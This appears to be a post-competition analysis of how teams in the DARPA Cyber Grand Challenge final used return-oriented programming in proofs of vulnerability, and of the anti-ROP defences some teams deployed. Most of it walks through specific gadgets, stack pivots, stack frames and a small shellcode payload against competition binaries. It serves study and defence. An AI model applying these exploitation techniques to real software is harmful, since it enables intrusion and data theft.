The Use of ROP in CFE
=====================

The relatively straight forward criteria for
proving vulnerabilities in CFE meant that long
ROP chains would not provide additional benefit for POVs.
Nevertheless, some ROP techniques were deployed by several
different teams in CFE.

Five CRS's demonstrated an ability to find simple ROP
gadgets necessary to adjust stack pointers and/or
load general registers for Type 1 POVs.

## Return to libc ##
The most prolific user of ROP was Codejitsu.  They employed
a "return to libc" technique to perform Type 2 POVs on 
five different services without relying on the execution of
payloads.  Their POVs transferred execution to transmit libraries,
with a stack frame crafted to transmit data directly from
the protected memory page.  No other team did this in CFE.

###KPRCA\_00065 Codejitus vs TechX, round 33, throw 1###
Like all successful POVs for this service, the POV overwrites the
otp\_verify\_otp return address.  At the point of the overwrite,
the stack frame requires adjustment before the transmit wrapper
can be invoked.  The frame, prior to adjustment, is shown below.

    BAAAAFA8  080483D3  _otp_consume:loc\_80483D3
    BAAAAFAC  00000000  MEMORY:00000000
    BAAAAFB0  00000000  MEMORY:00000000
    ooo
    BAAAAFD4  00000000  MEMORY:00000000
    BAAAAFD8  08049D00  xmit_wrapper
    BAAAAFDC  00000000  MEMORY:00000000
    BAAAAFE0  00000001  MEMORY:00000001
    BAAAAFE4  4347C000  MEMORY:4347C000
    BAAAAFE8  00001000  MEMORY:00001000

The gadget at the end of the \_opt\_consume function provides 
the necessary adjustment:

    080483D3 add     esp, 24h
    080483D6 pop     esi
    080483D7 pop     ebp
    080483D8 retn
    080483D8 _otp_consume endp

At the point of the retn above, the stack pointer is BAAAFD8,
thus transfering execution to the entry
point of a transmit function wrapper with arguments on the
stack that cause the service to send the entire magic page, 
(0x1000 bytes from 0x4347C000).

### KPRCA\_00065 Codejitsu vs ForAllSecure, round 33, throw 1 ###
The POV described above was against a TechX RCB.  It appears the nature of 
the RCB required the Codejitsu CRS to adjust the stack.  In the very
same round, against the reference service run by ForAllSecure, the Codejitsu 
POV did not perform any stack adjustment.  The same overwrite of the
otp\_verify\_opt return address caused execution to transfer directly to the
start of the *transmit* function.  And, more impressively, the POV structured
the stack such that the return from the transmit function led to the start
of the *terminate* function, resulting in a silent exit from the Type 2 POV.


## Control of a general register ##
All teams except CSDS and TechX employed a limited amount
of ROP to control the content of a general register and
adjust the stack pointer. In most cases, 
this resulted in Type 1 POVs, as in the following examples.

### NRFIN\_00063, Shellphish vs ForAllSecure round 59, throw 1 ###
As with all POVs for this service, a buffer overflow led to
overwriting a function pointer.  In this case,
the function pointer calls into a gadget at:

    0804E6F5 add     esp, 0BCh
    0804E6FB pop     esi
    0804E6FC pop     edi
    0804E6FD pop     ebx
    0804E6FE pop     ebp
    0804E6FF retn

Which returns to this gadget:

    0805253B pop     eax
    0805253C retn
    0805253C main endp

which SEGVs for the Type 1 POV, with eip:0xa19c96bf eax:0x498accea 

### NRFIN_00052 DeepRed vs ForAllSecure, round 84 throw 1 ###
Overwrite of a function pointer, transfers execution to:

    B7FFF00C mov     esp, eax
    B7FFF00E retn

Which is a payload whose execution is possible because the service 
allocates a buffer with the execute bit enabled (for no apparent reason).
The first instruction in the payload is a stack pivot that moves the 
stack to a location that the POV controls, i.e., containing data received 
at the same time that the function pointer was overwritten.  
The resulting stack contains:

    08060E3C  08048309  
    08060E40  584D455F 

Thus, the retn transfers execution to

    08048309 pop     ebp
    0804830A retn

Which results in a Type 1 POV, with eip:0x4e7c7450 ebp:0x584d455f 

## Convert to a Type 2 POV ##
In their one and only use of ROP, Disekt turned execution control
into a Type 2 POV.

### CROMU_00073 Disekt vs DeepRed, round 29 throw 1 ###
Overwrote a return address
to transfer control to this gadget,
which ends with the equivalent of jmp ecx.

    08050313 mov     ecx, [edx]
    08050315 mov     ebx, [edx+4]
    08050318 mov     esp, [edx+8]
    0805031B mov     ebp, [edx+0Ch]
    0805031E mov     esi, [edx+10h]
    08050321 mov     edi, [edx+14h]
    08050324 test    eax, eax
    08050326 jnz     short loc_8050329
    08050328 inc     eax
    08050329 mov     [esp], ecx
    0805032C retn

The retn at 805032C transfers to this payload in the stack, which transmits from the magic page.

    BAAAAEBA push    3
    BAAAAEBC pop     eax
    BAAAAEBD cdq
    BAAAAEBE xor     ebx, ebx
    BAAAAEC0 mov     ecx, offset off_BAAA8CF0
    BAAAAEC5 mov     dl, 7Fh 
    BAAAAEC7 mov     esi, ebx
    BAAAAEC9 int     80h    
    BAAAAECB jmp     ecx

CodeJitsu and ForAllSecure also employed the same gadget, but to perform Type 1 POVs.
And in one case, CodeJitsu used the gadget to call into a transmit function 
to perform a Type 2 POV.

## ROP to what? ##
ForAllSecure threw a POV that took a long way home.

### KPRCA\_00065 ForAllSecure vs TechX, round 34, throw 1 ###

The main function calls a read function, resulting in
a single DECREE receive syscall reading this into memory:

    0804E760  00000000 44454553 41414141 0804D42B  ....SEEDAAAA+...
    0804E770  89127F71 B9DECDD2 41414141 00000000  q.......AAAA....
    0804E780  49524556 41414141 41414141 0000008D  VERIAAAAAAAA....
    0804E790  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7A0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7B0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7C0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7D0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7E0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E7F0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E800  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    0804E810  41414141 C3A4618B BAAAAFB0 AAAF4453  AAAA.a......SD..
    0804E820  AAAFA0BA 414141BA 41414141 41414141  .....AAAAAAAAAAA
    0804E830  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA


Some time later, main calls opt\_verify\_, which calls memcpy, overwriting
the low order byte of the opt\_verify\_ return pointer from:

    BAAAAFA8  080481A5  main_0+105

to 

    BAAAAFA8  08048153  main_0:loc_8048153

with the value coming from the receive buffer 0x804E767 (above).

The retn transferred execution smack into the middle 
of the complex main.  

About 842,000 instructions later, a call to memcpy overwrites the memcpy return address
yielding a stack frame of:

    BAAAAF38  BAAAAFA0  MEMORY:BAAAAFA0
    BAAAAF3C  BAAAAF38  MEMORY:BAAAAF38
    BAAAAF40  0804E821  .data:0804E821
    BAAAAF44  00000004  MEMORY:saved_fp
    BAAAAF48  080493B1  fflush+C1

Again, the source of the corrupt return pointer is the initial 
receive buffer.

The payload, (memcpy'd from the same receive buffer), at BAAAAFA0 is simply:

    BAAAAFA0 mov     esp, [ecx-5Ch] ; BAAAAEDC
    BAAAAFA3 retn

The memory reference is to address BAAAAEDC, containing
0x804E76C, which is part of the initial buffer read via
the DECREE receive syscall.  That address contains 0x804D42B,
which leads to a simple pop-ret:

    0804D42B pop     esi
    0804D42C retn
    0804D42C sub_804D413 endp

And that retn finally yields the Type 1 POV with eip:0xb9decdd2 esi:0x89127f71 

While an 800,000 instruction ROP gadget seems outrageous, it has been demonstrated that the initial
low-order-byte overwrite of the opt\_verify\_ function return address is superfluous, and thus not 
likely deliberate. As an experiment, the return address was manually patched, and the POV still succeeded.

ForAllSecure threw this POV against TechX.  Three other teams
employed more pedestrian POVs against that same RCB.

## ROP Defenses ##
TechX generic defenses included an anti ROP technique in which their recompilation
of a service would insert a "nop" instruction following each "call".  They would then
replace each "retn" instruction with code that terminates the service if the destination 
is not a "nop".  They also inserted control flow cookies at addresses prior to function
pointer destinations, and checked for these cookies prior to following a function pointer.

Shellphish defended against corrupt function pointers, e.g., "call edx", by attempting to
ensure the destination is executable code; and refusing to call to a "pop" instruction.
